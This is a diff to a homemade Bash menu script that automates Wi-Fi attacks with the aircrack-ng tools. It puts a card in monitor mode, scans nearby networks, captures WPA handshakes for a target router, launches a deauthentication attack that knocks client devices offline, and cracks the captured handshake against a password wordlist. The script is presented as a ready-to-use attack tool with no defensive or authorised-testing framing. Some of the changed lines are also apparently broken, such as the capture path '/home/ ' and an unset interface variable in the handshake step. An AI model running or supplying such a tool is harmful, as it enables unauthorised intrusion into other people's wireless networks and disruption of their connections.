@@ -14,10 +14,15 @@ Wifi  () {
 	echo "Setting up monitor mode"
 	sleep 5
 	Banner
-	echo"THese are of the routers in your area, press CTRL + C when you've found the one you need"
-	sudo airodump-ng -w wifiNetworks --output-format txt wlan0mon
+#	sudo airodump-ng -w wifiNetworks --output-format txt wlan0mon
 	#sudo airodump-ng wlan0mon
+	Home
 
+}
+
+Networks () {
+	Banner
+	sudo airodump-ng -w wifiNetworks --output-format txt wlan0mon
 }
 
 Handshake () {
@@ -29,9 +34,7 @@ Handshake () {
         read CHANNEL
         clear
         echo "Listening to handshakes between router and devices"
-        sudo airodump-ng -c $CHANNEL --bssid $BSSID wlan0mon
-	sleep 5
-	Home
+        sudo airodump-ng -c $CHANNEL --bssid $BSSID -w /home/ $INTERFACE
 
 
 }
@@ -40,8 +43,7 @@ Handshake () {
 DeAuth () {
 	#This performs a deauth attack on target computers
 	Banner
-	echo "INterface ie. wlan0mon0"
-	read INTERFACE
+	INTERFACE="wlan0mon"
 	echo "Router id ie. E4:K6:N4:E4: "
 	read ROUTER
 	echo "CLient or station id: "
@@ -53,7 +55,7 @@ DeAuth () {
 
 Crack () {
 	Banner
-	echo "Make sure you have a txt file of passwords called passwords.txt in this directory"
+	echo "Make sure you have a txt file of passwords called passwords.txt saved on your desktop!"
 	echo "Enter name of .cap file ie. '0986.cp' :"
 	read NAME
 	sudo aircrack-ng /tao/Desktop/$NAME -w passwords.txt
@@ -61,23 +63,28 @@ Crack () {
 
 Home () {
 	Banner
-	echo "1. Set to monitor mode and view current networks"
-	echo "2. Capture Handshakes"
-	echo "3. Deauth Attack"
-	echo "4. Crack Captured HAndshakes"
+	echo "1. Set to monitor mode"
+	echo "2. View current networks"
+	echo "3. Capture Handshakes"
+	echo "4. Deauth Attack"
+	echo "5. Crack Captured HAndshakes"
 	read CHOICE
 	if [ $CHOICE = 1 ]
 	then Wifi
 	fi
-	if [ $CHOICE = 3 ]
-	then DeAuth
-	fi
 	if [ $CHOICE = 2 ]
+	then Networks
+	fi
+	if [ $CHOICE = 3 ]
         then Handshake
         fi
 	if [ $CHOICE = 4 ]
-        then Crack
+        then DeAuth
         fi
+        if [ $CHOICE = 5 ]
+        then Crack
+        else Home
+	fi
 
 }
 
